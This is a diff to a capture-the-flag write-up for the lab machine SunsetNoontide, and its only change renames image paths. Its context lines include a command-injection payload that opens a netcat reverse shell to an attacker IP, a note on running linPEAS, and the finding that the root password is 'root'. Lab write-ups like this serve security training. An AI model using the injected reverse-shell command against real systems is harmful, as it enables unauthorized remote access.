@@ -53,7 +53,7 @@ AB; nc 192.168.45.209 1234 -e /bin/bash
 
 **Initial Foothold Obtained**
 
-![img](/assets/images/CTF/Pg-Play/SunsetNoontide/shell.png)
+![img](/assets/images/CTF/Proving_Grounds/SunsetNoontide/shell.png)
 
 ## Privilege Escalation
 
@@ -61,7 +61,7 @@ Download and run [linPEAS](https://github.com/carlospolop/PEASS-ng/releases/down
 
 The results shows the root user access can be obtained by switching to root using password as `root`.
 
-![img](/assets/images/CTF/Pg-Play/SunsetNoontide/root.png)
+![img](/assets/images/CTF/Proving_Grounds/SunsetNoontide/root.png)
 
 Thanks for reading!
 
